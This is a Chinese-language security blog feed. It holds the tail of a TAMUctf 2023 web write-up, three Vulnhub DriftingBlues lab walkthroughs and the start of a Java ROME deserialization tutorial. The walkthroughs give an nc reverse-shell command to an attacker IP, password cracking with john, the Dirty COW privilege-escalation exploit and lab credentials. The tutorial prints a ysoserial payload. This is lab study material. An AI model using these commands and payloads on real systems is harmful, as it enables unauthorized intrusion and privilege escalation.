invoke__">Ok</span>(res)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">#[actix_web::main]</span></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">fn</span> <span class="title function_">main</span>() <span class="punctuation">-&gt;</span> std::io::<span class="type">Result</span>&lt;()&gt; &#123;</span><br><span class="line">    <span class="keyword">let</span> <span class="variable">addr</span> = std::env::<span class="title function_ invoke__">var</span>(<span class="string">&quot;SERVER_ADDR&quot;</span>)</span><br><span class="line">        .<span class="title function_ invoke__">expect</span>(<span class="string">&quot;Couldn&#x27;t find an appropriate server address; did you set SERVER_ADDR?&quot;</span>);</span><br><span class="line">    HttpServer::<span class="title function_ invoke__">new</span>(|| App::<span class="title function_ invoke__">new</span>().<span class="title function_ invoke__">service</span>(index).<span class="title function_ invoke__">service</span>(upload))</span><br><span class="line">        .<span class="title function_ invoke__">bind_uds</span>(addr)?</span><br><span class="line">        .<span class="title function_ invoke__">run</span>()</span><br><span class="line">        .<span class="keyword">await</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><a href="https://astr.cc/blog/tamuctf-2023-writeup/#web-lto">详解wp</a>   这里不太想看就不写了</p><h2 id="Flag-Fetcher"><a href="#Flag-Fetcher" class="headerlink" title="Flag Fetcher"></a>Flag Fetcher</h2><p>题目</p><p>两道题都是rust</p><p><a href="https://astr.cc/blog/tamuctf-2023-writeup/#flag-fetcher">详细wp</a></p><p>接下来就不写了</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;&lt;a href=&quot;https://github.com/tamuctf/tamuctf-2023/tree/master/web&quot;&gt;官方wp地址&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://velog.io/@sani/TAMU-CTF-writeups&quot;&gt;韩国</summary>
      
    
    
    
    
    <category term="TAMUctf 2023-web-复现" scheme="https://ke1nys.github.io/tags/TAMUctf-2023-web-%E5%A4%8D%E7%8E%B0/"/>
    
  </entry>
  
  <entry>
    <title>Vulnhub——DriftingBlues-9</title>
    <link href="https://ke1nys.github.io/posts/89f41699.html"/>
    <id>https://ke1nys.github.io/posts/89f41699.html</id>
    <published>2023-04-30T14:30:47.000Z</published>
    <updated>2023-05-03T12:37:29.080Z</updated>
    
    <content type="html"><![CDATA[<p>先扫一下c段发现靶机</p><p><img src="../images/image-20230430223340760.png" alt="image-20230430223340760"></p><p>然后扫一下端口</p><p><img src="../images/image-20230430223410966.png" alt="image-20230430223410966"></p><p>发现了个新端口  没见过</p><p><img src="../images/image-20230430223613576.png" alt="image-20230430223613576"></p><p>还是先查看一下80端口</p><p><img src="../images/image-20230430223917177.png" alt="image-20230430223917177"></p><p>查看源码发现版本和框架</p><p>那么就去找一下看存不存在漏洞</p><p><img src="../images/image-20230430224032571.png" alt="image-20230430224032571"></p><p>发现存在漏洞，于是就尝试进行漏洞利用</p><p><img src="../images/image-20230430224139189.png" alt="image-20230430224139189"></p><p>然后将脚本复制到出来执行</p><p><img src="../images/image-20230430224307635.png" alt="image-20230430224307635"></p><p><img src="../images/image-20230430224450992.png" alt="image-20230430224450992"></p><p>刚好发现了数据库的账号密码</p><p>这里的话使用的python2  python3的话会报错</p><p>这里看的不方便，于是尝试一下反弹shell</p><p><img src="../images/image-20230430224534036.png" alt="image-20230430224534036"></p><p>存在nc命令，可以使用nc反弹</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc 192.168.142.129 6666 -e /bin/bash</span><br></pre></td></tr></table></figure><p><img src="../images/image-20230430224640615.png" alt="image-20230430224640615"></p><p>反弹shell成功，那么我们就进行python的shell交互一下</p><p>那么我们就尝试一下刚刚拿到的数据的账号密码进行用户的切换</p><p><strong><code>clapton / yaraklitepe</code></strong></p><p>因为直接cd /home/clapton  权限不够</p><p><img src="../images/image-20230430224951322.png" alt="image-20230430224951322"></p><p>成功了</p><p>然后就可以拿到第一个flag了</p><p><img src="../images/image-20230430225059208.png" alt="image-20230430225059208"></p><p>这里的话又给出一个缓冲区溢出提权：</p><p>先把input文件下到本地</p><p>开启有个服务   python -m SimpleHTTPServer    因为http模块没有，就只能用这个模块了</p><p><img src="../images/image-20230430230743704.png" alt="image-20230430230743704"></p><p>成功下到本地</p><p>这里进行了解就行了  缓冲区溢出提权知道就行   实际的操作不太会</p><p><strong>总结</strong></p><p>开启python服务的两个方法</p><p><strong>python -m SimpleHTTPServer</strong></p><p><strong>python -m http.server</strong></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;先扫一下c段发现靶机&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;../images/image-20230430223340760.png&quot; alt=&quot;image-20230430223340760&quot;&gt;&lt;/p&gt;
&lt;p&gt;然后扫一下端口&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;../imag</summary>
      
    
    
    
    
    <category term="Vulnhub——DriftingBlues-9" scheme="https://ke1nys.github.io/tags/Vulnhub%E2%80%94%E2%80%94DriftingBlues-9/"/>
    
  </entry>
  
  <entry>
    <title>Vulnhub——DriftingBlues-6</title>
    <link href="https://ke1nys.github.io/posts/194b0b08.html"/>
    <id>https://ke1nys.github.io/posts/194b0b08.html</id>
    <published>2023-04-30T09:31:05.000Z</published>
    <updated>2023-05-03T12:37:29.079Z</updated>
    
    <content type="html"><![CDATA[<p>先扫c段发现靶机</p><p><img src="../images/image-20230430173241641.png" alt="image-20230430173241641"></p><p>然后接着扫一下端口</p><p><img src="../images/image-20230430173357986.png" alt="image-20230430173357986"></p><p>发现只有一个80端口</p><p>于是进行访问</p><p><img src="../images/image-20230430173451936.png" alt="image-20230430173451936"></p><p>然后就先扫一下目录吧</p><p><img src="../images/image-20230430173723541.png" alt="image-20230430173723541"></p><p><img src="../images/image-20230430173738876.png" alt="image-20230430173738876"></p><p>发现给了一个路劲</p><p>然后进行访问</p><p><img src="../images/image-20230430173804181.png" alt="image-20230430173804181"></p><p>这里的话爬虫协议也给了一个提示</p><p><strong>别忘了加上，zip扩展到你的dir brute</strong></p><p>然后在重新爆破一下目录，因为默认字典爆破不出来</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dirsearch -u http://172.16.5.12/ -e php -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 100  </span><br></pre></td></tr></table></figure><p><img src="../images/image-20230430174416125.png" alt="image-20230430174416125"></p><p>扫到有个目录，然后进行访问</p><p><img src="../images/image-20230430174504992.png" alt="image-20230430174504992"></p><p>发现下载下来了一个压缩包，但是访问得需要密码，那么我们就开始使用john进行爆破，就是得先把这个玩意转化成john能识别的样子</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">使用命令：zip2join spammer.zip  &gt;  password.txt</span><br></pre></td></tr></table></figure><p><img src="../images/image-20230430174655867.png" alt="image-20230430174655867"></p><p>然后进行爆破</p><p><img src="../images/image-20230430174724243.png" alt="image-20230430174724243"></p><p>爆破出来了</p><p>然后进行访问</p><p><img src="../images/image-20230430174828847.png" alt="image-20230430174828847"></p><p>发现给了个类似账号密码的东西，然后就开始进行后台登录</p><p><img src="../images/image-20230430174928134.png" alt="image-20230430174928134"></p><p>后台登录成功</p><p>这里就开始找漏洞利用点了</p><p><img src="../images/image-20230430175657042.png" alt="image-20230430175657042"></p><p>这里的话可以进行恶意文件的上传，刚好可以进行shell的反弹</p><p>这里的话就使用php反弹，这里的话kali自带，直接修改使用就行了</p><p><img src="../images/image-20230430191641753.png" alt="image-20230430191641753"></p><p>然后进去修改监听的ip和端口就行了</p><p><img src="../images/image-20230430191753036.png" alt="image-20230430191753036"></p><p>然后开始监听端口</p><p><img src="../images/image-20230430191825803.png" alt="image-20230430191825803"></p><p>然后就去找一下文件的上传地址</p><p><img src="../images/image-20230430191859356.png" alt="image-20230430191859356"></p><p><img src="../images/image-20230430191917306.png" alt="image-20230430191917306"></p><p>然后进行访问</p><p><img src="../images/image-20230430191939612.png" alt="image-20230430191939612"></p><p>反弹成功</p><p>然后进行python交互</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c &#x27;import pty; pty.spawn(&quot;/bin/bash&quot;)&#x27;</span><br></pre></td></tr></table></figure><p><img src="../images/image-20230430192021688.png" alt="image-20230430192021688"></p><p>成功，然后就开始进行提权了</p><p><img src="../images/image-20230430213348387.png" alt="image-20230430213348387"></p><p><strong>内核版本&gt;= 2.6.22</strong> ， 尝试脏牛提权</p><p><a href="https://xz.aliyun.com/t/9757">脏牛提权</a></p><p><img src="../images/image-20230430213803970.png" alt="image-20230430213803970"></p><p>执行 <strong><code>searchsploit 40839</code></strong>    因为这个脏牛就是利用这个来进行提权</p><p><img src="../images/image-20230430214020860.png" alt="image-20230430214020860"></p><p><img src="../images/image-20230430214107311.png" alt="image-20230430214107311"></p><p>然后本地开启一个python服务，把文件传到靶机上</p><p><img src="../images/image-20230430214340317.png" alt="image-20230430214340317"></p><p>成功传上去，然后进行gcc编译</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc -pthread 40839.c -o 40839 -lcrypt</span><br></pre></td></tr></table></figure><p><img src="../images/image-20230430214417629.png" alt="image-20230430214417629"></p><p>然后给命令添加最高权限</p><p><strong><code>chmod 777 40839</code></strong></p><p><img src="../images/image-20230430214530349.png" alt="image-20230430214530349"></p><p><img src="../images/image-20230430214743537.png" alt="image-20230430214743537"></p><p>然后就是root用户了</p><p><img src="../images/image-20230430214806980.png" alt="image-20230430214806980"></p><p><strong>总结</strong></p><p>内核版本&gt;= 2.6.22  尝试脏牛提权</p><p>尝试破解加密文件可以考虑先转成john能识别的样子，然后在使用john来进行破解</p><p>s</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;先扫c段发现靶机&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;../images/image-20230430173241641.png&quot; alt=&quot;image-20230430173241641&quot;&gt;&lt;/p&gt;
&lt;p&gt;然后接着扫一下端口&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;../imag</summary>
      
    
    
    
    
    <category term="Vulnhub——DriftingBlues-6" scheme="https://ke1nys.github.io/tags/Vulnhub%E2%80%94%E2%80%94DriftingBlues-6/"/>
    
  </entry>
  
  <entry>
    <title>Vulnhub——DriftingBlues-5</title>
    <link href="https://ke1nys.github.io/posts/80425ab2.html"/>
    <id>https://ke1nys.github.io/posts/80425ab2.html</id>
    <published>2023-04-30T07:46:24.000Z</published>
    <updated>2023-05-03T12:37:29.078Z</updated>
    
    <content type="html"><![CDATA[<p>开始先扫一下c段发现靶机</p><p><img src="../images/image-20230430155615236.png" alt="image-20230430155615236"></p><p>然后开始扫一下端口</p><p><img src="../images/image-20230430155709668.png" alt="image-20230430155709668"></p><p>还是标配两个端口</p><p>进行80端口的访问</p><p><img src="../images/image-20230430155746105.png" alt="image-20230430155746105"></p><p>是一个wordpress cms框架的网页 这里也给了版本</p><p>可以先用wpscan工具去进行扫描</p><p>这里先去找一下后台，用dirb先扫一下这个网址</p><p><img src="../images/image-20230430160144662.png" alt="image-20230430160144662"></p><p><img src="../images/image-20230430160134822.png" alt="image-20230430160134822"></p><p>扫到了后台，那么我们就去用wpcan工具去扫一下网站的用户名</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wpscan --url http://192.168.205.142 -e u </span><br></pre></td></tr></table></figure><p><img src="../images/image-20230430160547357.png" alt="image-20230430160547357"></p><p>然后使用cewl生成密码字典配合wpscan进行爆破</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cewl -m 3 -w passwd.txt http://192.168.205.142 </span><br></pre></td></tr></table></figure><p><img src="../images/image-20230430160711724.png" alt="image-20230430160711724"></p><p>-m  是指的密码的最短长度</p><p>然后使用wpcan进行爆破</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wpscan --url http://192.168.205.142/ -e u --passwords passwd.txt</span><br></pre></td></tr></table></figure><p><img src="../images/image-20230430161014964.png" alt="image-20230430161014964"></p><p>报出用户名和密码了，接下来进行登录</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Username: gill, Password: interchangeable</span><br></pre></td></tr></table></figure><p><img src="../images/image-20230430161140468.png" alt="image-20230430161140468"></p><p>成功进行登录</p><p>于是就开始尝试找漏洞了</p><p><img src="../images/image-20230430161251659.png" alt="image-20230430161251659"></p><p>发现一张网站页面没有的图片，于是尝试把他下载下来进行查看</p><p><img src="../images/image-20230430161407371.png" alt="image-20230430161407371"></p><p>成功下载下来</p><p>这里查看图片得使用这个工具</p><p><strong>exiftool</strong></p><p><img src="../images/image-20230430161620834.png" alt="image-20230430161620834"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">apt-get Install exiftool</span><br><span class="line">使用该命令进行安装</span><br></pre></td></tr></table></figure><p><img src="../images/image-20230430162208301.png" alt="image-20230430162208301"></p><p><img src="../images/image-20230430162232774.png" alt="image-20230430162232774"></p><p>发现了ssh的登录密码，于是尝试去进行登录</p><p><img src="../images/image-20230430162333707.png" alt="image-20230430162333707"></p><p>成功进行登录</p><p><img src="../images/image-20230430162354156.png" alt="image-20230430162354156"></p><p>拿到第一个flag，这里有第二个文件，不知道是啥</p><p>直接读的话是乱码</p><p>上网搜索后发现</p><p><img src="../images/image-20230430162524584.png" alt="image-20230430162524584"></p><p><img src="../images/image-20230430163023836.png" alt="image-20230430163023836"></p><p>这里的话是使用scp命令将文件复制到本地进行查看</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">scp gill@192.168.142.149:/home/gill/key* /root</span><br></pre></td></tr></table></figure><p><img src="../images/image-20230430163242074.png" alt="image-20230430163242074"></p><p>成功传输下来</p><p><strong>将 <code>keyfile.kdbx</code> 内容转为 <code>john</code> 支持的格式：<code>keepass2john keyfile.kdbx &gt; Keepasshash.txt</code></strong></p><p><img src="../images/image-20230430163335747.png" alt="image-20230430163335747"></p><p>然后使用john进行密码的爆破</p><p><img src="../images/image-20230430163622503.png" alt="image-20230430163622503"></p><p>爆破出来那个加密文件里的内容了</p><p>将刚才的keyfile.kdbx文件上传到keeWeb, 输入破解出的密码即可打开，得到六个类似密码的字符串</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">链接：https://app.keeweb.info/</span><br></pre></td></tr></table></figure><p>获得了6个密码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">2real4surreal </span><br><span class="line">buddyretard</span><br><span class="line">closet313</span><br><span class="line">exalted</span><br><span class="line">fracturedocean</span><br><span class="line">zakkwylde</span><br></pre></td></tr></table></figure><p>然后尝试使用这些密码进行root用户的登录全都失败了</p><p><img src="../images/image-20230430170151033.png" alt="image-20230430170151033"></p><p>这里的话可以利用这个工具来进行使，看一下进程有没有定时执行的任务</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">kali起个临时服务</span><br><span class="line">靶机下载pspy64: wget http://192.168.111.7/pspy64</span><br><span class="line">给予权限：chmod +x pspy64</span><br><span class="line">执行：./pspy64</span><br></pre></td></tr></table></figure><p><img src="../images/image-20230430170732813.png" alt="image-20230430170732813"></p><p>成功下载下载到靶机上</p><p><img src="../images/image-20230430171115969.png" alt="image-20230430171115969"></p><p>这个任务每隔一分钟就自动执行一次，于是就猜测是会定时执行任务，那么我们就考虑使用他来进行提权了</p><p><img src="../images/image-20230430171233766.png" alt="image-20230430171233766"></p><p>在根目录下发现一个诡异的目录，于是进行查看</p><p>那么猜测是使用他进行提权，这里久刚好用到之前爆破出来的密码了，在查看别人的wp，发现key.sh源码的意思是，如果这个文件下有fracturedocean这个文件的话，就会执行下面的代码，就会把装有root，密码的文件下载下来</p><p><img src="../images/image-20230430171856129.png" alt="image-20230430171856129"></p><p>拿到密码</p><p><img src="../images/image-20230430171951855.png" alt="image-20230430171951855"></p><p>这就是key.sh的文件内容了</p><p><strong>Vulnhub靶机渗透总结：</strong><br>1.cewl 生成字典和wpscan 工具暴力破解的使用<br>2.Exiftool 这个工具用来对EXIF信息解析(第一次了解这个工具的使用和作用)<br>3..kdbx文件密码破解（新知识点，第一次做花的时间比较多）<br>4.如果临时开启不了web服务 可以使用scp 这个命令（非常好用！！）<br>5.解密 keepass 数据库获取密码（虽然没啥用 但是也是第一次了解 新知识点）<br>6.定时提权 下载脚本pspy64 查看 创建key 文件提权</p><p>这里的pspy64可以进行进程的查看(不用root权限)，刚好可以进行判断是否存在定时提权</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;开始先扫一下c段发现靶机&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;../images/image-20230430155615236.png&quot; alt=&quot;image-20230430155615236&quot;&gt;&lt;/p&gt;
&lt;p&gt;然后开始扫一下端口&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;../</summary>
      
    
    
    
    
    <category term="Vulnhub——DriftingBlues-5" scheme="https://ke1nys.github.io/tags/Vulnhub%E2%80%94%E2%80%94DriftingBlues-5/"/>
    
  </entry>
  
  <entry>
    <title>java反序列化-Rome</title>
    <link href="https://ke1nys.github.io/posts/a91085da.html"/>
    <id>https://ke1nys.github.io/posts/a91085da.html</id>
    <published>2023-04-27T12:59:30.000Z</published>
    <updated>2023-05-08T11:14:16.260Z</updated>
    
    <content type="html"><![CDATA[<p><a href="https://goodapple.top/archives/1145">参考文章</a></p><p>从零开始分析</p><p>ROME 是一个可以兼容多种格式的 feeds 解析器，可以从一种格式转换成另一种格式，也可返回指定格式或 Java 对象。ROME 兼容了 RSS (0.90, 0.91, 0.92, 0.93, 0.94, 1.0, 2.0), Atom 0.3 以及 Atom 1.0 feeds 格式。</p><p>Rome 提供了 <strong>ToStringBean</strong> 这个类，提供深入的 toString 方法对JavaBean进行操作。</p><h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>Idea 新建一个Maven项目</p><p>这里直接到maven包就行了</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependencies</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>junit<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>junit<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">version</span>&gt;</span>4.11<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">scope</span>&gt;</span>test<span class="tag">&lt;/<span class="name">scope</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>rome<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>rome<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.0<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.javassist<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>javassist<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">version</span>&gt;</span>3.28.0-GA<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">dependencies</span>&gt;</span></span><br></pre></td></tr></table></figure><p>新建一个demo来进行触发漏洞</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Poc</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException,ClassNotFoundException &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">base64_exp</span> <span class="operator">=</span> <span class="string">&quot;BASE64_STRING&quot;</span>;</span><br><span class="line">        <span class="type">byte</span>[] exp =  Base64.getDecoder().decode(base64_exp);</span><br><span class="line">        <span class="type">ByteArrayInputStream</span> <span class="variable">bytes</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(exp);</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">objectInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(bytes);</span><br><span class="line">        objectInputStream.readObject();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="../images/image-20230508140800599.png" alt="image-20230508140800599"></p><p>然后关掉 IDEA 的 toString 对象视图, 因为该选项会默认调用实例方法的 toString, 并且会忽略 toString 中设置的断点, 而 ROME 链涉及到 ToStringBean 的 toString 方法</p><p><img src="../images/image-20230508141203769.png" alt="image-20230508141203769"></p><p>利用<code>ysoserial</code>生成弹计算器的<code>payload</code>：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -jar ysoserial.jar ROME <span class="string">&#x27;calc&#x27;</span>|base64</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rO0ABXNyABFqYXZhLnV0aWwuSGFzaE1hcAUH2sHDFmDRAwACRgAKbG9hZEZhY3RvckkACXRocmVzaG9sZHhwP0AAAAAAAAB3CAAAAAIAAAACc3IAKGNvbS5zdW4uc3luZGljYXRpb24uZmVlZC5pbXBsLk9iamVjdEJlYW6CmQfedgSUSgIAA0wADl9jbG9uZWFibGVCZWFudAAtTGNvbS9zdW4vc3luZGljYXRpb24vZmVlZC9pbXBsL0Nsb25lYWJsZUJlYW47TAALX2VxdWFsc0JlYW50ACpMY29tL3N1bi9zeW5kaWNhdGlvbi9mZWVkL2ltcGwvRXF1YWxzQmVhbjtMAA1fdG9TdHJpbmdCZWFudAAsTGNvbS9zdW4vc3luZGljYXRpb24vZmVlZC9pbXBsL1RvU3RyaW5nQmVhbjt4cHNyACtjb20uc3VuLnN5bmRpY2F0aW9uLmZlZWQuaW1wbC5DbG9uZWFibGVCZWFu3WG7xTNPa3cCAAJMABFfaWdub3JlUHJvcGVydGllc3QAD0xqYXZhL3V0aWwvU2V0O0wABF9vYmp0ABJMamF2YS9sYW5nL09iamVjdDt4cHNyAB5qYXZhLnV0aWwuQ29sbGVjdGlvbnMkRW1wdHlTZXQV9XIdtAPLKAIAAHhwc3EAfgACc3EAfgAHcQB+AAxzcgA6Y29tLnN1bi5vcmcuYXBhY2hlLnhhbGFuLmludGVybmFsLnhzbHRjLnRyYXguVGVtcGxhdGVzSW1wbAlXT8FurKszAwAGSQANX2luZGVudE51bWJlckkADl90cmFuc2xldEluZGV4WwAKX2J5dGVjb2Rlc3QAA1tbQlsABl9jbGFzc3QAEltMamF2YS9sYW5nL0NsYXNzO0wABV9uYW1ldAASTGphdmEvbGFuZy9TdHJpbmc7TAARX291dHB1dFByb3BlcnRpZXN0ABZMamF2YS91dGlsL1Byb3BlcnRpZXM7eHAAAAAA/////3VyAANbW0JL/RkVZ2fbNwIAAHhwAAAAAnVyAAJbQqzzF/gGCFTgAgAAeHAAAAaeyv66vgAAADIAOQoAAwAiBwA3BwAlBwAmAQAQc2VyaWFsVmVyc2lvblVJRAEAAUoBAA1Db25zdGFudFZhbHVlBa0gk/OR3e8+AQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEAEkxvY2FsVmFyaWFibGVUYWJsZQEABHRoaXMBABNTdHViVHJhbnNsZXRQYXlsb2FkAQAMSW5uZXJDbGFzc2VzAQA1THlzb3NlcmlhbC9wYXlsb2Fkcy91dGlsL0dhZGdldHMkU3R1YlRyYW5zbGV0UGF5bG9hZDsBAAl0cmFuc2Zvcm0BAHIoTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007W0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7KVYBAAhkb2N1bWVudAEALUxjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NOwEACGhhbmRsZXJzAQBCW0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7AQAKRXhjZXB0aW9ucwcAJwEApihMY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTtMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9kdG0vRFRNQXhpc0l0ZXJhdG9yO0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7KVYBAAhpdGVyYXRvcgEANUxjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL2R0bS9EVE1BeGlzSXRlcmF0b3I7AQAHaGFuZGxlcgEAQUxjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7AQAKU291cmNlRmlsZQEADEdhZGdldHMuamF2YQwACgALBwAoAQAzeXNvc2VyaWFsL3BheWxvYWRzL3V0aWwvR2FkZ2V0cyRTdHViVHJhbnNsZXRQYXlsb2FkAQBAY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL3J1bnRpbWUvQWJzdHJhY3RUcmFuc2xldAEAFGphdmEvaW8vU2VyaWFsaXphYmxlAQA5Y29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL1RyYW5zbGV0RXhjZXB0aW9uAQAfeXNvc2VyaWFsL3BheWxvYWRzL3V0aWwvR2FkZ2V0cwEACDxjbGluaXQ+AQARamF2YS9sYW5nL1J1bnRpbWUHACoBAApnZXRSdW50aW1lAQAVKClMamF2YS9sYW5nL1J1bnRpbWU7DAAsAC0KACsALgEABGNhbGMIADABAARleGVjAQAnKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1Byb2Nlc3M7DAAyADMKACsANAEADVN0YWNrTWFwVGFibGUBACB5c29zZXJpYWwvUHduZXIxNjM4NzExMzMzOTc4NzU0MQEAIkx5c29zZXJpYWwvUHduZXIxNjM4NzExMzMzOTc4NzU0MTsAIQACAAMAAQAEAAEAGgAFAAYAAQAHAAAAAgAIAAQAAQAKAAsAAQAMAAAALwABAAEAAAAFKrcAAbEAAAACAA0AAAAGAAEAAAAvAA4AAAAMAAEAAAAFAA8AOAAAAAEAEwAUAAIADAAAAD8AAAADAAAAAbEAAAACAA0AAAAGAAEAAAA0AA4AAAAgAAMAAAABAA8AOAAAAAAAAQAVABYAAQAAAAEAFwAYAAIAGQAAAAQAAQAaAAEAEwAbAAIADAAA